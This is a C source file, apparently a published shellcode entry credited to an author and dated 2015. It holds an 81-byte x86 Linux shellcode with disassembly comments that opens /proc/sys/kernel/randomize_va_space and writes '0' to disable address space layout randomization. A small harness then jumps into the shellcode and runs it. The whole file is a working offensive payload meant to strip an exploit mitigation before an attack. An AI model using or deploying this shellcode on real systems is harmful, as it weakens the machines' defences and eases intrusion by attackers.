/*
Disable ASLR in Linux x86 (81 bytes)
Author: MMxM (@hc0d3r)
Sáb Mai  2 12:20:44 BRT 2015
*/

#include <stdio.h>
#include <string.h>

unsigned const char sc[] =
	"\x31\xc0"	//xor    %eax,%eax
	"\x31\xc9"	//xor    %ecx,%ecx
	"\x99"	//cltd
	"\xb0\x05"	//mov    $0x5,%al
	"\x51"	//push   %ecx
	"\x68\x70\x61\x63\x65"	//push   $0x65636170
	"\x68\x76\x61\x5f\x73"	//push   $0x735f6176
	"\x68\x69\x7a\x65\x5f"	//push   $0x5f657a69
	"\x68\x6e\x64\x6f\x6d"	//push   $0x6d6f646e
	"\x68\x6c\x2f\x72\x61"	//push   $0x61722f6c
	"\x68\x65\x72\x6e\x65"	//push   $0x656e7265
	"\x68\x79\x73\x2f\x6b"	//push   $0x6b2f7379
	"\x68\x6f\x63\x2f\x73"	//push   $0x732f636f
	"\x68\x2f\x2f\x70\x72"	//push   $0x72702f2f
	"\x89\xe3"	//mov    %esp,%ebx
	"\x66\xb9\x01\x02"	//mov    $0x201,%cx
	"\xcd\x80"	//int    $0x80
	"\x89\xc3"	//mov    %eax,%ebx
	"\x31\xc0"	//xor    %eax,%eax
	"\xb0\x04"	//mov    $0x4,%al
	"\x51"	//push   %ecx
	"\x6a\x30"	//push   $0x30
	"\x89\xe1"	//mov    %esp,%ecx
	"\x42"	//inc    %edx
	"\xcd\x80"	//int    $0x80
	"\x31\xc0"	//xor    %eax,%eax
	"\xb0\x06"	//mov    $0x6,%al
	"\xcd\x80"	//int    $0x80
;

int main(void){
	printf("Shellcode length: %d bytes\n", strlen(sc));

	__asm__ ("jmp sc");

	return 0;
}
